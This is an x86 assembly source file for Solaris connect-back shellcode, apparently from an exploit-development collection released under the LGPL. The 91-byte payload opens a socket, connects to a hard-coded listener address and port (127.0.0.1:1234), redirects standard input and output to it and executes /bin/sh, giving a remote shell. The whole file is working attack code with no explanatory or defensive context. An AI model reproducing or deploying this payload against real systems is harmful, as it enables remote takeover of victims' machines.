/*
 *  sol-x86-cntsockcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Socket versions. Used by the socket library when calling _so_socket().
 */
#define	SOV_STREAM	0	/* Not a socket - just a stream */
#define	SOV_DEFAULT	1	/* Select based on so_default_version */
#define	SOV_SOCKSTREAM	2	/* Socket plus streams operations */
#define	SOV_SOCKBSD	3	/* Socket with no streams operations */
#define	SOV_XPG4_2	4	/* Xnet socket */

.global _start

_start:

# 91 bytes

syscallcode:
    pushl   $0x3cffd8ff
    pushl   $0x65
    movl    %esp,%esi
    notl    0x04(%esi)
    notb    (%esi)

cntsockcode:
    pushl   $0x0101017f
    pushw   $0xd204
    pushw   $0x02
    movl    %esp,%edi

    pushl   $0x02 /* SOV_SOCKSTREAM */
    xorl    %eax,%eax
    pushl   %eax
    pushl   %eax
    pushl   $0x02
    pushl   $0x02 /* Used as SOV_SOCKSTREAM when calling connect() */
    movb    $0xe6,%al
    call    *%esi

    pushl   $0x10
    pushl   %edi
    pushl   %eax
    xorl    %eax,%eax
    movb    $0xeb,%al
    call    *%esi

    popl    %ebx
    pushl   %ebx
    pushl   $0x09
    pushl   %ebx

0:
    pushl   $0x3e
    popl    %eax
    call    *%esi

    decl    -0x20(%edi)
    jns     0b

shellcode:
#   xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
    pushl   %eax
    pushl   %ecx
    pushl   %ebx
    movb    $0x3b,%al
    call    *%esi

